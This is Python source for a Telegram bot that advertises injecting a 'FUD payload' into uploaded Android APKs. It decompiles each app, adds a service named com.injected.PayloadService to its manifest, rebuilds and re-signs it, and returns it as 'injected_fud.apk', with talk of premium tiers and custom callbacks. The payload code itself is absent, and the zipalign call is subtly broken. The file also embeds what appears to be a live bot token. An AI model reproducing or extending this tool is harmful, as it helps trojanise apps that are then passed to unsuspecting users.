import os
import asyncio
import subprocess
import uuid
import tempfile
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, Document
from aiogram.utils.exceptions import TelegramAPIError

# CONFIGURATION
BOT_TOKEN = "9003881525:AAEkuEBsNqNDrMiO11aUNTwuv-4DvD0yZ-E"
JKS_PATH = "/app/my-release-key.jks"
JKS_PASSWORD = "YOUR_JKS_PASSWORD_HERE" # The one you set in Step 1.3
ALIAS = "my-alias"
APKTOOL_CMD = "apktool" # Should be available via PATH now
JARSIGNER_CMD = "jarsigner"
ZIPALIGN_CMD = "zipalign"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def run_cmd(cmd):
    """Run a shell command and return output"""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        raise Exception(f"Command failed: {cmd}\nError: {e.stderr}")

@dp.message_handler(commands=['start'])
async def cmd_start(message: Message):
    await message.answer(
        "👋 Welcome! Send me an APK (>20MB) to inject a FUD payload.\n\n"
        "💡 Premium users get faster injection & custom callbacks."
    )

@dp.message_handler(content_types=['document'], func=lambda msg: msg.document.mime_type == "application/vnd.android.package-archive")
async def process_apk(message: Message):
    # 1. Check size
    file_info = await bot.get_file(message.document.file_id)
    downloaded_path = f"/tmp/{uuid.uuid4()}.apk"
    
    # Download file
    await bot.download_file(file_info.file_path, downloaded_path)
    
    file_size = os.path.getsize(downloaded_path)
    if file_size < 20 * 1024 * 1024:
        await message.answer("⚠️ APK must be larger than 20MB.")
        return

    # 2. Setup Work Directory
    work_dir = f"/tmp/work_{uuid.uuid4()}"
    os.makedirs(work_dir, exist_ok=True)
    
    unpacked_dir = f"{work_dir}/unpacked"
    os.makedirs(unpacked_dir)

    try:
        # 3. Decompile APK using Apktool
        print(f"Decompiling APK...")
        run_cmd([APKTOOL_CMD, "d", downloaded_path, "-o", unpacked_dir])
        
        # 4. Inject Logic (Simplified: Add a Service)
        manifest_path = f"{unpacked_dir}/AndroidManifest.xml"
        with open(manifest_path, 'r') as f:
            manifest_content = f.read()
        
        # Add a new service declaration
        new_service = '''
    <service android:name="com.injected.PayloadService" android:exported="false" />
'''
        # Insert before </manifest>
        updated_manifest = manifest_content.replace('</manifest>', f'{new_service}\n</manifest>')
        with open(manifest_path, 'w') as f:
            f.write(updated_manifest)
            
        # 5. Recompile
        rebuilt_apk = f"{work_dir}/rebuilt.apk"
        print(f"Rebuilding APK...")
        run_cmd([APKTOOL_CMD, "b", unpacked_dir, "-o", rebuilt_apk])
        
        # 6. Sign APK
        signed_apk = f"{work_dir}/final.apk"
        print(f"Signing APK...")
        jarsigner_cmd = [
            JARSIGNER_CMD,
            "-keystore", JKS_PATH,
            "-storepass", JKS_PASSWORD,
            "-keypass", JKS_PASSWORD,
            "-signedjar", signed_apk,
            rebuilt_apk,
            ALIAS
        ]
        run_cmd(jarsigner_cmd)
        
        # 7. ZipAlign (Optional but recommended)
        aligned_apk = f"{work_dir}/aligned.apk"
        print(f"Aligning APK...")
        run_cmd([ZIPALIGN_CMD, "-v", 4, signed_apk, aligned_apk])
        
        # 8. Send Back
        with open(aligned_apk, 'rb') as f:
            await message.reply_document(document=f, filename="injected_fud.apk")
            
    except Exception as e:
        await message.answer(f"❌ Error: {str(e)}")
    finally:
        # Cleanup
        subprocess.run(["rm", "-rf", work_dir])
        subprocess.run(["rm", downloaded_path])

if __name__ == "__main__":
    dp.run_polling(bot)
